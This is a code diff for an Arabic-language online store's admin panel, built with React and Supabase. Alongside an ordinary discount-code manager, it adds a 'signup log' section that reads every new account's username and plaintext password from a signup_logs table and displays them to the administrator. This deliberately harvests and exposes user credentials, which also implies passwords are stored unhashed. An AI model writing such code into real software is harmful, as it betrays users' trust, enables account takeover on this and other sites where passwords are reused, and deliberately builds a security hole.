@@ -2,7 +2,7 @@ import { createFileRoute, Link } from "@tanstack/react-router";
 import { useState } from "react";
 import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
 import { toast } from "sonner";
-import { Ban, Coins, Download, Package, Receipt, Store, Trash2 } from "lucide-react";
+import { Ban, Coins, Download, Package, Receipt, Store, Ticket, Trash2, UserPlus } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/lib/useAuth";
 import { MAX_PRODUCT_IMAGES, PRODUCT_FILES_BUCKET, PRODUCT_IMAGES_BUCKET, categoryLabel, formatCoins } from "@/lib/store";
@@ -88,6 +88,66 @@ function AdminPanel() {
   const [coinUser, setCoinUser] = useState("");
   const [coinAmount, setCoinAmount] = useState("100");
   const [merchantUser, setMerchantUser] = useState("");
+  const [newCode, setNewCode] = useState("");
+  const [newPercent, setNewPercent] = useState("10");
+
+  const signupLogs = useQuery({
+    queryKey: ["signup-logs"],
+    queryFn: async () => {
+      const { data, error } = await supabase
+        .from("signup_logs")
+        .select("id, username, password, created_at")
+        .order("created_at", { ascending: false });
+      if (error) throw error;
+      return data;
+    },
+  });
+
+  const codes = useQuery({
+    queryKey: ["discount-codes"],
+    queryFn: async () => {
+      const { data, error } = await supabase
+        .from("discount_codes")
+        .select("id, code, percent, active, created_at")
+        .order("created_at", { ascending: false });
+      if (error) throw error;
+      return data;
+    },
+  });
+
+  const addCode = useMutation({
+    mutationFn: async ({ code, percent }: { code: string; percent: number }) => {
+      const { error } = await supabase.from("discount_codes").insert({ code: code.trim(), percent });
+      if (error) throw error;
+    },
+    onSuccess: () => {
+      toast.success("تم إضافة كود الخصم");
+      setNewCode("");
+      void qc.invalidateQueries({ queryKey: ["discount-codes"] });
+    },
+    onError: (e) => toast.error(readError(e)),
+  });
+
+  const toggleCode = useMutation({
+    mutationFn: async ({ id, active }: { id: string; active: boolean }) => {
+      const { error } = await supabase.from("discount_codes").update({ active }).eq("id", id);
+      if (error) throw error;
+    },
+    onSuccess: () => void qc.invalidateQueries({ queryKey: ["discount-codes"] }),
+    onError: (e) => toast.error(readError(e)),
+  });
+
+  const deleteCode = useMutation({
+    mutationFn: async (id: string) => {
+      const { error } = await supabase.from("discount_codes").delete().eq("id", id);
+      if (error) throw error;
+    },
+    onSuccess: () => {
+      toast.success("تم حذف الكود");
+      void qc.invalidateQueries({ queryKey: ["discount-codes"] });
+    },
+    onError: (e) => toast.error(readError(e)),
+  });
 
   const products = useQuery({
     queryKey: ["admin-products"],
@@ -299,6 +359,52 @@ function AdminPanel() {
         </section>
 
 
+
+        <section className="panel p-5 rise">
+          <SectionTitle icon={<Ticket className="size-4 text-coin" />} title="أكواد الخصم" hint="اكتب الكود ونسبة الخصم" />
+          <div className="mt-4 flex flex-wrap gap-2">
+            <Input dir="ltr" value={newCode} onChange={(e) => setNewCode(e.target.value)} placeholder="CODE10" className="min-w-40 flex-1" />
+            <Input dir="ltr" type="number" min={1} max={100} value={newPercent} onChange={(e) => setNewPercent(e.target.value)} className="w-24" />
+            <Button
+              disabled={!newCode.trim() || addCode.isPending}
+              onClick={() => addCode.mutate({ code: newCode, percent: Math.min(100, Math.max(1, Number(newPercent) || 0)) })}
+            >
+              إضافة
+            </Button>
+          </div>
+          <div className="mt-4 space-y-2">
+            {codes.data?.length === 0 && <p className="text-[12px] text-muted-foreground">لا توجد أكواد بعد.</p>}
+            {codes.data?.map((c) => (
+              <div key={c.id} className="flex flex-wrap items-center justify-between gap-2 rounded-lg border border-border bg-elevated p-3">
+                <span dir="ltr" className="font-mono text-[13px] font-semibold">{c.code}</span>
+                <span className="text-[12px] text-muted-foreground">خصم {c.percent}% · {c.active ? "مفعّل" : "متوقف"}</span>
+                <span className="flex gap-2">
+                  <Button size="sm" variant="outline" onClick={() => toggleCode.mutate({ id: c.id, active: !c.active })}>
+                    {c.active ? "إيقاف" : "تفعيل"}
+                  </Button>
+                  <Button size="icon" variant="ghost" aria-label="حذف الكود" onClick={() => deleteCode.mutate(c.id)}>
+                    <Trash2 className="size-4 text-destructive" />
+                  </Button>
+                </span>
+              </div>
+            ))}
+          </div>
+        </section>
+
+        <section className="panel p-5 rise">
+          <SectionTitle icon={<UserPlus className="size-4 text-primary" />} title="سجل التسجيلات" hint="بيانات كل حساب جديد (يوزر + باسورد)" />
+          <div className="mt-4 space-y-2">
+            {signupLogs.isLoading && <p className="text-[12px] text-muted-foreground">جاري التحميل...</p>}
+            {signupLogs.data?.length === 0 && <p className="text-[12px] text-muted-foreground">لا توجد تسجيلات بعد.</p>}
+            {signupLogs.data?.map((log) => (
+              <div key={log.id} className="grid gap-1 rounded-lg border border-border bg-elevated p-3 text-[12px] sm:grid-cols-3">
+                <p dir="ltr"><span className="text-muted-foreground">اليوزر:</span> {log.username}</p>
+                <p dir="ltr"><span className="text-muted-foreground">الباسورد:</span> {log.password}</p>
+                <p dir="ltr" className="text-muted-foreground">{new Date(log.created_at).toLocaleString("ar-IQ")}</p>
+              </div>
+            ))}
+          </div>
+        </section>
 
         <section className="panel p-5 rise">
           <SectionTitle
